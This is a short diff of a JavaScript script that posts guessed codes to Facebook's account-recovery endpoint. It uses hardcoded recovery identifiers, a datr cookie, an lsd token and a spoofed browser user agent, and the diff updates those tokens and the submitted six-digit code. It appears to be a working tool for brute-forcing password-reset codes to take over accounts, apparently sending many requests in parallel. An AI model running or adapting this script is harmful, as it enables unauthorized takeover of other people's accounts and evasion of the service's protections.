@@ -13,9 +13,9 @@ const httpClient = new Http2Client(false);
 const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
 
 (async () => {
-  const cuid = 'AYhFfb0t5vLTNBU02BK9xuH23Zr54CK8g7YuvEez2f2Ce5iZzYmN2wlvkq-qNBvAzUDwF29h6DS9MKGY1i16wR4zKilBIgfhmrjVimTDANTwiQ';
+  const cuid = 'AYhyjsPOa2ljwZHlS3GHmiGEkxM5dAMClHQlVvZiPqWr1oLfJj77RFcISukZhbw5p311cSdaQ8XNn-5fXEfk6Q7Aa3FWyuYUTRn26AIKIhII_w';
   const datr = 'LS4uaKqjexvPknJhuSVD1BWM';
-  const lsd = 'AVrCihG3OoQ';
+  const lsd = 'AVrCihG3UA0';
   const url = 'https://www.facebook.com/recover/code/?cuid='+cuid;
   const headers = {
     'Cookie': 'datr='+datr,
@@ -35,6 +35,6 @@ const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, l
 
   Promise.all(p).then(() => {
     log('end');
-    httpClient.post(url, headers, 'lsd='+lsd+'&n=281667').then(res => log(res.statusCode));
+    httpClient.post(url, headers, 'lsd='+lsd+'&n=521062').then(res => log(res.statusCode));
   });
 })();
